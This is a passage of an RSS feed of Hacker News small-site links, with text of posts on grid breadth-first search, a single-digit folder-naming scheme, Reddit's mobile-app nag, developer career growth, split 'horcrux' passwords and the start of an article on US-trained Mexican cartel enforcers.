<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://larry.denenberg.com/earliest-sunset.html">http://larry.denenberg.com/earliest-sunset.html</a></em></p>]]>
            </description>
            <link>http://larry.denenberg.com/earliest-sunset.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25503062</guid>
            <pubDate>Tue, 22 Dec 2020 05:03:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Interactive Breadth First Search in a Grid]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25502936">thread link</a>) | @todsacerdoti
<br/>
December 21, 2020 | https://www.henryschmale.org/2020/12/20/bfs-grid-explorer.html | <a href="https://web.archive.org/web/*/https://www.henryschmale.org/2020/12/20/bfs-grid-explorer.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Interactive Breadth First Search in a Grid</p>
    <p>
        2020 December 20
    </p>
</div><div>
    <p><a href="https://en.wikipedia.org/wiki/Breadth-first_search">Breadth first search(BFS)</a> is a very powerful and useful algorithm for
exploring graph like structures. A BFS searches it’s nearest neighbors first
before moving on. It’s main use is to find a path using
the fewest hops. Here we use it to explore a grid that can be modified
by a user. In this grid, we have verticies (the grid boxes), and edges 
(the box north, south, east and west).</p>

<p>A plain english example would be as</p>

<ol>
  <li>Create a queue with your starting element.</li>
  <li>while the queue is not empty
    <ol>
      <li>shift out the first element.</li>
      <li>does that element meet the goal?
        <ol>
          <li>If so quit with success</li>
        </ol>
      </li>
      <li>Otherwise for all neighbors of that element add them to the queue 
if they haven’t been seen yet. Make a note of where we came from.</li>
    </ol>
  </li>
  <li>Otherwise fail.</li>
</ol>


<ol>
  <li>Change your grid size of anything between 4 and 40 elements wide. 
Hit the reset grid button.</li>
  <li>Set your start point using the “place start point” button. There must 
be exactly one starting point.</li>
  <li>Place some finish points using the “place finish point” button. There 
can be many finish points. In a regular BFS these are your target 
points.</li>
  <li>Add some constraints by drawing some walls.</li>
  <li>Hit either “Run” or “Step” to start the BFS
    <ol>
      <li>The active node will be surounded with a <span>gold</span> border.</li>
      <li>Discovered nodes are surrounded with a <span>dark blue</span> border.</li>
      <li>The nodes in the queue are surrounded with a <span>light blue</span> border.</li>
    </ol>
  </li>
  <li>After the goal is found it will draw the path back to the starting node. It will be shown in
 <span>light green</span></li>
</ol>






<p>You can view and explore the source code on <a href="https://github.com/HSchmale16/TS_BFS_Graph_Explorer">GitHub</a>. Made with
TypeScript because I can.</p>

<!-- todo: refactor BFS_explorer to be an include -->





</div></div>]]>
            </description>
            <link>https://www.henryschmale.org/2020/12/20/bfs-grid-explorer.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25502936</guid>
            <pubDate>Tue, 22 Dec 2020 04:44:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Canonical Folders: Organize files with a prefixed single digit]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25502836">thread link</a>) | @speckle
<br/>
December 21, 2020 | http://vgan.ca/canonical-folders.html | <a href="https://web.archive.org/web/*/http://vgan.ca/canonical-folders.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  <p><span>21 Dec 2020</span></p><h2 id="organize-the-files">Organize the Files</h2>
<p>I started experimenting with  <a href="https://en.wikipedia.org/wiki/Zettelkasten">zettelkasten</a>-style note taking. This meant I quickly made hundreds of files and needed to organize them somehow. I could have a single folder and just search, but I often can’t remember an appropriate query. Maps of content help, but those need organizing, too. Enter <a href="https://johnnydecimal.com/">Johnny Decimal</a>, a folder naming scheme for organizing projects. I liked it and changed it a bit. So here’s my take for a file organization system.</p>

<h2 id="overview">Overview</h2>
<p>This is a system for organizing my files. It’s a folder naming system with a single rule. Additional best practices naturally emerge, but the rule stands alone.</p>

<p><strong>Every folder name is prefixed by a single digit</strong>.</p>

<p>That’s it. That’s the system. I call it <strong>Canonical Folders</strong>. A folder is a canonical folder if:</p>
<ul>
  <li>Its name is prefixed by a single digit,</li>
  <li>Its digit is unique among sibling folders and directly follows the previous digit, and</li>
  <li>Every folder in it is also a canonical folder. Every single folder.</li>
</ul>

<p>Here’s a truncated example of the canonical folders for my zettelkasten-style knowledge garden:</p>

<div><div><pre><code>0 Meta
	0 Maps of Content
	1 Templates
	2 Images
	3 System Description
1 Log
	0 Daily Notes
	1 Weekly Notes
	2 Yearly Notes
	3 Finance Log
2 Me
	0 Personal Development
	1 People
		0 Family
		1 Grade School Friends
		2 Univeristy Friends
		3 Seattle Friends
	2 Goals
3 Primitives
	0 Observations
	1 Mindset Opinions
	2 Assertions
	3 Questions
4 Media
	0 Books
	1 Internet Sites
	2 Public People
	3 Organizations
	4 Youtube Videos
5 Guides
6 Interests
</code></pre></div></div>

<h2 id="how-to-start-using-canonical-folders">How to Start using Canonical Folders</h2>
<p>Begin by lazily making canonical folders for the content you are storing. Do this only as needed and make the folders as specific as possible.</p>

<p>Begin with 0. Once you reach 2 or higher, consider renumbering them to form a logical ordering. A great default order is when you created the folder.</p>

<p>Once you reach 7 or higher, consider creating a general, encompassing folder and put several of the existing folders in there, resetting the numbering to start from 0. If it’s under 5, resist the temptation to create subfolders to avoid pre-emptive over-organization.</p>

<p>Rarely should you reach number 9. If you do, it is a sign to re-design your folder structure. This constraint forces you to organize when necessary.</p>

<h2 id="details">Details</h2>
<p>This system imposes one strict, draconian rule, and restricts nothing else. The design has four primary benefits.</p>

<ul>
  <li>Folders feel curated. It makes a folder feel <em>intentionally designed</em> and part of a system, instead of a mishmash of one-offs and ad-hoc names.</li>
  <li>It constrains you to max 10 folders per level. This enforces you to keep the number of folders per level limited to a human’s working memory capacity. Each folder feels important because of this imposed scarcity.</li>
  <li>It lets you control ordering. This avoids ad-hoc alphabetical ordering and makes you <em>intentionally choose</em> an appropriate ordering.</li>
  <li>It’s self-evident. It orders ten or less things. You don’t need an explicit explanation of the system. It’s more affordant than two digits or high unicode characters that need additional explaining. It’s simple, not intimidating, and aesthetically pretty, which will make you care about adhering to it.</li>
</ul>

<p>These benefits will invite you to curate a series of intentionally designed folders. You’ll craft a hierarchy for yourself to help you develop a mental layout of where all your digital files are. Using it is analogous to how it’s more rewarding to navigate to a landmark from memory instead of following a GPS. You will feel more in control and enjoy browsing through the many folders.</p>

<h2 id="try-it">Try it</h2>
<p>Canonical folders is a system to help you tidy up your computer files. Use it by putting a digit in front of every folder name.</p>

<p>It’s fun, speeds up worst-case retrieval time, and the practice of making them helps you categorize and synthesize what information you are storing. Like finally getting a room organized with proper storage, the maintenance effort is outweighed by the cognitive peace achieved.</p>

<p><em>Thanks to Kyle for reviewing drafts of this.</em></p>


</div></div>]]>
            </description>
            <link>http://vgan.ca/canonical-folders.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25502836</guid>
            <pubDate>Tue, 22 Dec 2020 04:27:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[This Community is Available in the App]]>
            </title>
            <description>
<![CDATA[
Score 111 | Comments 52 (<a href="https://news.ycombinator.com/item?id=25502828">thread link</a>) | @rukshn
<br/>
December 21, 2020 | https://ruky.me/2020/12/22/this-community-is-available-in-the-app/ | <a href="https://web.archive.org/web/*/https://ruky.me/2020/12/22/this-community-is-available-in-the-app/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Yesterday’s <a href="https://ruky.me/2020/12/21/a-to-do-app-that-fits-in-a-single-tweet/">post</a> was an awesome one, I learned a lot in JavaScript and and I was happy to see people doing what I thought impossible. Writing a simple todo app within 280 chars, in plain js.</p>
<p>After I finished writing the post, I wanted to share it on Reddit JavaScript community, r/javascript at the same time I shared it on HackerNews.</p>
<p>I have seen lot of comments on HackerNews criticizing the new Reddit design, using JavaScript and breaking in their mobile website, and constant nags pushing the users to their mobile app.</p>
<p>I was one of those few who liked their new design on desktop, no page loads between posting something, lot of white spaces, I feel most of the average users would be feeling the same, except for the tech community. But as a service Reddit should be looking at the common denominator, not the outliers.</p>
<p>I’m annoyed with the mobile app nag, when I visit the mobile website, Reddit is always asking me to download the mobile app. But I just cancel it and move along in the mobile browser.</p>
<p>But what happened yesterday just took me off the ledge. When I visited the r/javascript community on my iPad, I was greeted with this screen.</p>
<figure><img data-attachment-id="73" data-permalink="https://ruky.me/2020/12/22/this-community-is-available-in-the-app/img_0041/" data-orig-file="https://i0.wp.com/ruky.me/wp-content/uploads/2020/12/img_0041.png?fit=1536%2C2048&amp;ssl=1" data-orig-size="1536,2048" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_0041" data-image-description="" data-medium-file="https://i0.wp.com/ruky.me/wp-content/uploads/2020/12/img_0041.png?fit=225%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/ruky.me/wp-content/uploads/2020/12/img_0041.png?fit=768%2C1024&amp;ssl=1" loading="lazy" width="768" height="1024" src="https://i0.wp.com/ruky.me/wp-content/uploads/2020/12/img_0041.png?resize=768%2C1024&amp;ssl=1" alt="" srcset="https://i0.wp.com/ruky.me/wp-content/uploads/2020/12/img_0041.png?resize=768%2C1024&amp;ssl=1 768w, https://i0.wp.com/ruky.me/wp-content/uploads/2020/12/img_0041.png?resize=225%2C300&amp;ssl=1 225w, https://i0.wp.com/ruky.me/wp-content/uploads/2020/12/img_0041.png?resize=1152%2C1536&amp;ssl=1 1152w, https://i0.wp.com/ruky.me/wp-content/uploads/2020/12/img_0041.png?w=1536&amp;ssl=1 1536w" sizes="(max-width: 768px) 100vw, 768px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ruky.me/wp-content/uploads/2020/12/img_0041.png?resize=768%2C1024&amp;ssl=1 768w, https://i0.wp.com/ruky.me/wp-content/uploads/2020/12/img_0041.png?resize=225%2C300&amp;ssl=1 225w, https://i0.wp.com/ruky.me/wp-content/uploads/2020/12/img_0041.png?resize=1152%2C1536&amp;ssl=1 1152w, https://i0.wp.com/ruky.me/wp-content/uploads/2020/12/img_0041.png?w=1536&amp;ssl=1 1536w" data-lazy-src="https://i0.wp.com/ruky.me/wp-content/uploads/2020/12/img_0041.png?resize=768%2C1024&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>This community is only available in the app.</figcaption></figure>
<p>Why do you block me from from visiting the community from my mobile device?</p>
<p>Will the whole mobile website is scrapped and you end up with a landing page to download the mobile app?</p>
<p><strong>If you want to visit a popular subreddit</strong>, <strong>install our up and use it, or else login. </strong></p>
<p>I’ve managed to see the subreddit by requesting the desktop website, but I’m sure they will figure out a way, by checking the screen size to block this as well.</p>
<p>I understand that, as a company, you need to push to gain as much users as possible on their mobile devices, that’s the best way to track, to send notifications and keep you hooked and keep coming back. If I had a company like Reddit I might have done the same.</p>
<p>But for blocking users from their mobile devices, a service they once offered is a very dark pattern, instead what they should do is introduce some awesome features that will make the users download the app by themselves so they can enjoy those features. Not forcing the app though their throats.</p>
<p>Anyone else experienced a similar experience on Reddit mobile?</p>
<p><em>Only after writing the and checking the screenshot again made me see that they allow you to see the subreddit by logging in. But that is obscured and they intend to push users to download the app.</em></p>
</div></div>]]>
            </description>
            <link>https://ruky.me/2020/12/22/this-community-is-available-in-the-app/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25502828</guid>
            <pubDate>Tue, 22 Dec 2020 04:24:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Software Developer's Guide to Career Ownership]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25502812">thread link</a>) | @mooreds
<br/>
December 21, 2020 | https://cult.honeypot.io/reads/developer-career-ownership-guide/ | <a href="https://web.archive.org/web/*/https://cult.honeypot.io/reads/developer-career-ownership-guide/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2 id="Is Your Career Drifting Out To Sea?">Is Your Career Drifting Out To Sea?</h2><p>Like a frog who's slowly being boiled in a pot but doesn't realise it, two years into my career I slowly came to discover that I wasn't progressing anywhere near what I thought I should have.</p><p>I was learning tons and growing in my skills. But it seemed like that didn't matter.</p><p>Failed job interviews, tiny salary increases after delivering on difficult long-term projects, bitterness, etc. were the results.</p><p><b>Have you ever felt the same way as I did? Feel like your quality of work and effort doesn't get the recognition and results you expected?</b></p><p>One year, I was flat-out told that I wouldn't be getting a raise because I had spent some time on parental leave (even though I had delivered on a critical project that year).</p><p>Another time, I failed a job interview due to my poor attitude and bitterness towards a situation which in reality was a very complex project that needed strong ownership, patience and leadership.</p><h2 id="I took ownership of my career">I took ownership of my career</h2><p>Faced with the reality of career progression as a software developer, I decided to make an intentional effort to take ownership of my career.</p><p>What does that mean, you ask?</p><blockquote><p><b>Taking ownership of your career means that you realise your career is an organic thing that you can either nurture and grow, ignore or even damage.</b></p></blockquote><p>It's like a garden: deciding what seeds to plant, where to plant, how to nurture your plants, deciding what plants to sow more of, etc.</p><p>If you are intentional about planting and maintaining your garden then you should get results.</p><p>If you don't maintain your plants then your garden will most likely get grown over with weeds and not do so well!</p><p>And, if you don't plant any seeds yet expect a garden to appear - well, that's kinda crazy.</p><p>Your career is the same! If you simply expect that "doing a good job" will land you promotions or position you as a competitive asset in the job market then it's just like that last analogy of ignoring your garden!</p><h2 id="Does doing good work mean getting recognised?"><b>Does doing good work mean getting recognised?</b></h2><p>For myself, the root falsehood I believed was that <i>doing good work would lead to being recognised.</i></p><p>Sadly, most of the time, that's just not true.</p><p>Our managers are overloaded with their tasks. They are juggling personal issues, internal HR conflicts, overdue projects, etc.</p><p>Is "just doing a good job" going to make you stand-out in their minds? <i>Nope.</i></p><p>This is the biggest piece of advice I give everyone who comes to me with career advice:</p><p><b>You need to simply stand-out.</b></p><p>Whether that's within your company, among other resumes, within the greater developer community, etc.</p><h2 id="Reputation"><b>Reputation</b></h2><h3><b>What is it?</b></h3><p>Reputation just means "how much you stand-out" combined with your overall professional competence.</p><p>Reputation = How much you stand-out + competence.</p><p>Think of your programming "heroes": they are very skilled and competent. <i>Yet</i>, they are constantly putting themselves in public by promoting themselves, sharing their thoughts, sharing their "wins", etc.</p><p>Do you think they have trouble landing new jobs? <i>Nope.</i></p><p>Does that mean you need to become a programming hero to get promoted and land that new job? Not at all.</p><blockquote><p>I'm simply pointing out that self-promotion, helping other people, getting involved in communities, networking with other professionals and building long-lasting relationships are all part of building your reputation.</p></blockquote><p>If you are always helping your manager, discussing your "wins" and asking about how your work has affected the company then you'll ensure that you're top of mind.</p><p>The fact is, most developers hardly talk to their managers about their work and how it's impacting the company.</p><p>Tip: Show an interest in your manager. Make their job easier by doing awesome work. And, ask about how your work is improving the company. <i>One-on-one meetings are a great time to ask about these things.</i></p><h2 id="Questions that others ask about YOU"><b>Questions that others ask about YOU</b></h2><p>Everyone is forming an opinion and view of who you are, how skilled you are, etc.</p><p>Here's a short list to get you thinking about what others are asking themselves about <b>YOU</b>:</p><ul><li><p>Are they kind?</p></li><li><p>Helpful?</p></li><li><p>Intelligent?</p></li><li><p>Do good work?</p></li><li><p>Produce results?</p></li><li><p>Learns quickly?</p></li><li><p>Good at mentoring and teaching others?</p></li></ul><p>Make sure that you can "check" all of those off!</p><p>If you are always complaining and have a poor attitude, then your peers will not see you in a good light.</p><p>On the other hand, if you aren't learning and growing then your peers will see you like a stagnant resource that will, over time, drag down the team!</p><h2 id="Navigating the stages of your career">Navigating the stages of your career</h2><p>Before looking at the specifics of how you can start to grow your reputation and grow in your career, you should get an idea of what general career stage you are at.</p><p>I use a simple framework to layout the common career path stages that most software developers will find themselves in.</p><p>The stages are:</p><ul><li><p>Coder</p></li><li><p>Junior Developer</p></li><li><p>Intermediate Developer</p></li><li><p>Senior Developer</p></li><li><p>Lead Developer</p></li><li><p>Tech Leader</p></li></ul><p>These stages are <b>not job titles.</b> They represent a developer's real experience and competence.</p><p>It's been said that someone with 10 years experience might, in practice, have repeated the same 1 year of experience over-and-over!</p><p>Let's take a look at these stages to get an idea of where you fit and where you might want to go in the future.</p><h3>Coder</h3><p>A coder is a hobbyist.</p><p>If you don't get paid professionally or work with a team of other developers, then you might be a coder.</p><h3>Junior developer</h3><p>A junior developer is entering the IT field as a paid professional and they work with a team of other professionals.</p><p>Are you a junior developer?</p><p>If you've been a professional developer for less than a year (as a very general figure) then you're probably a junior.</p><p>Take a look at the next stage to see if it resonates. If not, then you might still be a junior who's transitioning into becoming an intermediate developer.</p><h3>Intermediate developer</h3><p>An intermediate developer is a competent team member and contributor.</p><p>The telling sign I use for this stage is that <b>intermediate developers usually have a mental urge or "pull" to believe that they know everything they need to know.</b></p><p>Perhaps they feel like their views on how to best architect a system are "complete."</p><p>Perhaps they feel like Javascript is the only programming language they ever need and ever want.</p><p>Whatever it is, there is some degree of feeling like they've "found" the silver bullet or that their current view is finally "the one."</p><blockquote><p><b>The intermediate stage is like stepping into puberty for your career.</b></p></blockquote><p>For example, teens tend to begin believing that they know better than their parents.</p><p>They tend to experiment and be bold about what they believe.</p><p>They begin to tread a path of their own.</p><p>This is the intermediate developer. They are starting to think for themselves.</p><h3>Senior developer</h3><p>The senior developer is becoming very skilled and knowledgeable to the point that those around them are looking to them as a mentor and a "go-to".</p><p>They usually have some specialised or advanced programming knowledge and can build more complex systems using advanced techniques and patterns.</p><p>Seniors are confident in what they know due to their experiences. But they also have a grasp on the fact that there's <i>so much they don't know about.</i></p><p>The biggest telling sign that you are in this stage is whether or not your peers are constantly coming to you for advice and guidance. Are you mentoring others too? These are all signs of being a senior developer.</p><h3>Lead developer</h3><p>The lead developer is focused on providing high-level guidance to their dev team.</p><p>But more importantly, they are a bridge or connector between the development team and the other business-oriented departments in your organisation.</p><p>Are you leading a team of developers? Do you also have to communicate with non-technical managers or other departments about what the development team is working on, etc? If so, you're a lead developer.</p><h3>Tech Leader</h3><p>I hesitate to include this one, but I think it's helpful to see where your career could go in the future.</p><p>A tech leader has made a name for themselves as an expert in some specific area(s) and usually have a very targeted branding/positioning as to what they do well.</p><p>That might be a specific programming language, web security, front-end development with react, a developer mentor, or even a particular industry.</p><p>They could be community builders who have a following of people that look up to them as a direct or indirect mentor.</p><p>They could be thought leaders who champion some specific cause or idea.</p><p>They usually speak publicly about their area of expertise or the ideas that they champion.</p><p>In a nutshell, they are technology experts and very skilled communicators.</p><p>If that sounds like you, then you might be a tech leader.</p><h2 id="How to get to the next stage">How to get to the next stage</h2><p>I've written elsewhere about specific tips to move between each career step. For the moment, I want to highlight some more general pieces of advice that anyone can leverage and use to move forward.</p><h3>Stand-out</h3><p>You need to stand-out within your company if you want to land promotions and be a part of important and growth-inducing projects.</p><p><b>Find a gap within your team or company that could help solve some important problems your company is facing.</b></p><p>Practically speaking, if you are early in your career, just keep an eye out for whenever your peers seem surprised at some skill or way of doing things you have. This might indicate a gap that could be helpful to your organisation!</p><figure><img alt="Tulip standing out" src="https://images.ctfassets.net/cjwb7umaxoxv/21BebbVbTAiiI20dza4oac/a4a8fcfd76d42b38da278dc8a9f8449d/rupert-britton-l37N7a1lL6w-unsplash.jpg"><figcaption>Photo by Rupert Britton on Unsplash</figcaption></figure><p>For example, if you did something fancy with CSS that other developers notice and are impressed with, then that could indicate a gap.</p><p>For more seasoned developers, it should be more apparent what gaps need to be filled. And, the more experienced you are, the more you should naturally drift into a position of mentoring others and having a clear picture of what gaps need to be filled.</p><p>Once you are seasoned, you can use this principle and apply it to the global community - not just your internal company. Try to figure out where there is a need or where certain trends seem to be pointing.</p><p>The specific gap you fill doesn't matter so much. The point is that <b>you need to stand-out as a competent problem-solver who …</b></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://cult.honeypot.io/reads/developer-career-ownership-guide/">https://cult.honeypot.io/reads/developer-career-ownership-guide/</a></em></p>]]>
            </description>
            <link>https://cult.honeypot.io/reads/developer-career-ownership-guide/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25502812</guid>
            <pubDate>Tue, 22 Dec 2020 04:22:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Double Blind Passwords a.k.a. Horcruxing]]>
            </title>
            <description>
<![CDATA[
Score 332 | Comments 178 (<a href="https://news.ycombinator.com/item?id=25502703">thread link</a>) | @phantom_rehan
<br/>
December 21, 2020 | https://kaizoku.dev/double-blind-passwords-aka-horcruxing | <a href="https://web.archive.org/web/*/https://kaizoku.dev/double-blind-passwords-aka-horcruxing">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1607775961422/elXIChWIZ.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=compress"><div><div><div><div><p>Subscribe to <!-- -->my<!-- --> newsletter and never miss <!-- -->my<!-- --> upcoming articles</p></div></div></div><div itemprop="text"><p>Before we get into Horcruxing, here's a quick prologue on online security hygiene. You can skip to the  <a href="#double-blind-passwords-aka-horcruxing">Horcruxing section</a>  if it seems redundant.</p>
<h3 id="rules-for-strong-online-security">Rules for Strong Online Security</h3>
<p>1.
<strong>Longer passwords (atleast 16 characters) are better than shorter ones</strong></p>
<pre><code>=&gt; cutesamantha15101995 &gt; cutesamantha
</code></pre><p>2.
<strong>Randomized passwords are better than personally identifiable passwords</strong></p>
<pre><code>=&gt; process-cancel-stingy-garnet &gt; cutesamantha15101995
</code></pre><p><strong>NOTE: </strong> <code>process-cancel-stingy-garnet</code> is technically a passphrase - basically an easy-to-remember password in comparison to randomized strings like <code>B6fSpxMj&amp;f6DU@5^k</code></p>
<p>3.
<strong>Have a <em>significantly</em> different password for each account</strong></p>
<p>Having the same password for different accounts is like using the same key for different locks. It beats the whole point of having multiple locks! Also, having different passwords but with only one easily guessable word different (like the ones below) still poses the same risk. The passwords should be <strong><em>significantly</em></strong> different.</p>
<pre><code>bounce-unfold-stunning-chute        process-cancel-stingy-facebook
symptom-untouched-unpaid-arena  &gt;   process-cancel-stingy-twitter
sediment-tweak-annually-koala       process-cancel-stingy-gmail
</code></pre><p>4.
<strong>Use 2FA/MFA wherever possible</strong></p>
<p>Both Google and Facebook offer a 2FA feature where you need the second factor only when you login from a new device or a new location, instead of needing 2FA every time. That's a rare combination of convenience &amp; security right there! 
Most other sites also offer some variation of 2FA.</p>
<p><strong>NOTE</strong>: Use the  <a target="_blank" href="https://play.google.com/store/apps/details?id=org.shadowice.flocke.andotp">andOTP</a>  (or any other) app's TOTP as the second factor since it cannot be spoofed or spied on lock-screen like the SMS OTP and does not require a mobile network or internet connection. You can also use Biometrics (finger print or face recognition)</p>
<blockquote>
<p>Woah! How do I create a long password for each of the bazillion websites out there, <em>and</em> have them significantly different <em>and</em> remember them? Security seems like such a pain in the ass!</p>
</blockquote>
<h3 id="enter-password-manager">[enter] <strong>PASSWORD MANAGER</strong></h3>
<p>A password manager helps you manage all your passwords in one place, either in the form of a browser extension, mobile app, or website. Good password managers will offer a browser extension and a mobile app with one-click auto-fill-login-page feature by removing the hassle of copy pasting or typing your login details. A few smart ones even detect phishing pages and warn you indirectly, by not showing the login details for such web pages.</p>
<p>They enable all the above measures for strong online security with ease. While I agree it takes some effort to set it up for the very first time. But, after that, it just flows like butter. </p>
<p><br>
For example, password generator in <a target="_blank" href="https://bitwarden.com/">BitWarden</a> lets you custom design your random password in different flavours.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1607770748804/m93T3kqUH.png?auto=compress" alt="BitWarden's password generator"></p>
<h3 id="yay-im-secure">YAY! I'm Secure!</h3>
<p>You meticulously move all your passwords and secrets to a trusted password manager. Finally, you can rest easy knowing that your digital life is truly secure. Or, is it?  <br></p>
<p><strong>What if </strong></p><ul>
<li>your master password (the password to your password manager) is compromised due to a security breach or you left it in plaintext on a post-it/ email/ notes app</li>
<li>someone gained temporary access to your unlocked system (computer or phone) when you stepped away to get that last coffee for the day and your password manager is still logged in for everyone to see</li>
</ul>
<p>The answer: you're <strong><em>screwed</em></strong>. The cost of putting all your eggs in one basket is that it could all go into oblivion in one fell swoop. How do you overcome this challenge now? </p>
<h3 id="double-blind-passwords-aka-horcruxing">Double Blind Passwords (aka Horcruxing)</h3>
<p>For all his faults, Voldemort did one good thing for us muggles. He gave us the concept of a horcrux. For the uninitiated, a horcrux is any object in which you store a piece of your soul, putting the proverbial eggs of your soul into different baskets, to gain quasi-immortality. </p>
<p><strong>The basic idea</strong>: You split your password into 2 parts - one which is stored in the password manager, and the other which is stored in your head (aka horcrux).</p>
<p>Basically, at any given point in time, you and your password manager know only a piece of the password. It's double-blind. In effect, just like You-Know-Who, you're splitting your password (soul) into pieces and storing them in different places.</p>
<h4 id="before">BEFORE</h4>
<pre><code>
<span>username: rick</span>
<span>password: rollthepeople1732</span>


<span>username: rick</span>
<span>password: rollthepeople1732</span>
</code></pre><h4 id="after">AFTER</h4>
<pre><code>
<span>username: rick</span>
<span>password: roll-the-people-venus</span>


<span>horcrux: papel</span>


<span>username: rick</span>
<span>password: roll-the-people-venuspapel</span>
</code></pre><p>The horcrux adds an additional layer of security that only you can unlock. It's a kind of 2FA. Again, the longer the horcrux the better. But, a simple word should also be fine as long as only you know the horcrux.</p>
<p>If it feels like too much effort, use a horcrux only for the most important logins - your social media, bank accounts etc. </p>
<h3 id="one-last-thing">One Last Thing</h3>
<p>Security is never absolute. One can try to secure a system as tightly as possible, but never really say that it is fully secure (if you see someone claiming otherwise, it's mostly marketing bullshit). If we cannot make systems completely secure, the next best thing to do is to make them as secure as possible and a good way to do it is <a target="_blank" href="https://en.wikipedia.org/wiki/Defense_in_depth_(computing">Defense In Depth</a> - basically make sure that even if one layer of security is breached, there exist other layers to mitigate further damage - which is what we've tried to achieve all along.</p>
<h3 id="summary">Summary</h3>
<p>1.
Use a good password manager </p>
<blockquote>
<p>I use BitWarden (since it is open source and costs just $10 a year for the PRO features)</p>
</blockquote>
<p>2.
Use TOTP/ biometrics instead of SMS-based OTP</p>
<blockquote>
<p>I use andOTP (since it is open source)</p>
</blockquote>
<p>3.
Use a horcrux (a double-blind password) for the most important logins</p>

<p>P.S. Keep in mind that horcruxing only works fine until you connect your brain to NeuraLink and accidentally upload your thoughts online for everyone to see. :P</p>
</div></div></section></div></div>]]>
            </description>
            <link>https://kaizoku.dev/double-blind-passwords-aka-horcruxing</link>
            <guid isPermaLink="false">hacker-news-small-sites-25502703</guid>
            <pubDate>Tue, 22 Dec 2020 03:58:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Unconventional Warfare in Mexico: The US Trained Some of Its Most Brutal Cartels]]>
            </title>
            <description>
<![CDATA[
Score 20 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25502435">thread link</a>) | @AndrewBissell
<br/>
December 21, 2020 | https://narco.news/unconventional-warfare-in-mexico | <a href="https://web.archive.org/web/*/https://narco.news/unconventional-warfare-in-mexico">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-120a3898=""><div data-v-120a3898=""><p><a href="https://fas.org/irp/doddir/dod/jp1_02.pdf">Unconventional Warfare</a> (UW): Activities conducted to enable a resistance movement or insurgency to coerce, disrupt, or overthrow a government or occupying power by operating through or with an underground, auxiliary, and guerrilla force in a denied area.</p><figure><div><div><p><img src="https://publish.narco.news/content/images/2020/12/Screen-Shot-2020-12-20-at-5.49.19-PM.png" width="1000" height="888"></p><p><img src="https://publish.narco.news/content/images/2020/12/Screen-Shot-2020-12-20-at-5.49.29-PM.png" width="1000" height="888"></p></div></div><figcaption>Unconventional Warfare associated terminology <a href="https://www.soc.mil/ARIS/books/pdf/Unconventional%20Warfare%20Pocket%20Guide_v1%200_Final_6%20April%202016.pdf">Special Operations Command</a></figcaption></figure><hr><p><em>Los Zetas</em> were the highly-trained enforcers of the Gulf cartel made up of supposed deserters from the Mexican special forces known as the <em>Grupo AeromÃ³vil de Fuerzas Especiales </em>(GAFE). The GAFES<em> </em>were formed in 1986 as an elite quick reaction force specializing in counterinsurgency and unconventional warfare. When the North American Free Trade Agreement went into effect in 1994, the GAFES received combat experience in the brutal fight with the leftist <em>EjÃ©rcito Zapatista de LiberaciÃ³n Nacional</em> (EZLN) in Chiapas. According to <a href="http://historic.edualter.org/material/ddhh/proc1.htm">reporting by Carlos Marin</a>, the army sent the GAFES to Chiapas to <strong>create paramilitaries and displace the population</strong> in order to break the support of the people for the EZLN, an approach which would be used against organized crime years later. In Ioan Grillo's book <em>El Narco</em>, he describes how the mutilated bodies of rebels captured by the GAFES were dumped along a riverbank in the Las Margaritas municipality with their ears and noses sliced off, the sort of spectacular violence that <em>Los Zetas</em> would later standardize in the Drug War.</p><figure><img src="https://publish.narco.news/content/images/2020/10/Screen-Shot-2020-10-26-at-5.09.07-PM-1.png"><figcaption>2005 FBI memo about <em>Los Zetas</em></figcaption></figure><p>Some of the original members of <em>Los Zetas</em> are said to have been <a href="https://nsarchive2.gwu.edu/NSAEBB/NSAEBB499/DOCUMENT01-20050422.PDF">trained by the U.S.</a> at the notorious School of the Americas, although accounts vary about exactly who, where and when. Some say it was at <a 